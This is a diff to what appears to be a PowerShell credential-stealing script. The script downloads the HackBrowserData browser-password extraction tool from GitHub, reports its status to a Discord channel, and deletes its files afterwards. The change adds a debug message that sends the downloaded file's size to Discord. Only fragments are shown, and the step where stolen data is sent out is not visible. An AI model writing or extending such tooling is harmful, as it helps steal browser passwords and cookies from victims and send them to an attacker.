@@ -31,6 +31,12 @@ try {
     $url = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip"
     Invoke-WebRequest -Uri $url -OutFile "hbd.zip" -UseBasicParsing
     
+    # DEBUG
+    $fileExists = Test-Path "hbd.zip"
+    $fileSize = if($fileExists){(Get-Item "hbd.zip").Length}else{0}
+    Send-Discord "🔍 DEBUG: File exists=$fileExists | Size=$fileSize bytes"
+    
+    
     if (!(Test-Path "hbd.zip")) {
         Send-Discord "❌ **Download failed**"
         exit
@@ -90,3 +96,4 @@ Start-Sleep 2
 Remove-Item hbd.zip,HBD -Recurse -Force -EA 0
 
 Send-Discord "🧹 **FINISHED**"
+
